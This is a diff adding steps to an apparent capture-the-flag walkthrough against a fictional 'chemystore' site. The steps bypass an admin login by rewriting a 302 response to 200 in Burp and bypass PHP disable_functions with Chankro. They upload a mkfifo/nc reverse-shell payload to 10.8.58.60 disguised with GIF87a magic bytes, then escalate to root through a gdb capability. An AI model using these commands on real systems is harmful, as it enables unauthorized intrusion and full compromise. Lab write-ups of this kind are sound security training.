@@ -17,4 +17,30 @@ Our Cyber Incident Response team has received information about illegal sales on
 #+end_src
 
 : http://chemystore.hv/connection/dbconnect.php
-1
+: http://chemystore.hv/adminpanel/
+
+When access /adminpanel/ we receive 302 status code, with redirection to /webadmin/login.php.
+
+If we catch the response of the request, just modify the 302 status code to 200 code, and we can bypass the login page.
+
+With burp, just create an Match and Replace rule, to modify the response header value 302 to 200, and when you access the /webadmin/ page, automatically access the login, and don t need to stay with the intercept on
+
+* bypass disable functions
+
+To get an reverse shell with the upload function, we need to bypass a lot of disable php functions and get the shell with someway
+
+Use -> https://github.com/TarlogicSecurity/Chankro and https://www.youtube.com/watch?v=4a_VDA9Bw0J
+
+*payload* ->
+: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.8.58.60 9001 >/tmp/f
+
+Add the magic gif at start
+: GIF87a
+
+Send it to the application and set the listener
+: nc -nlvp 9001
+
+* Priv escalation
+
+The gdb binary has capability set, with GTFobins get the command to gdb.
+: /usr/bin/gdb /bin/bash -nx -ex 'python import os; os.setuid(0); os.execl("/bin/bash", "bash")'
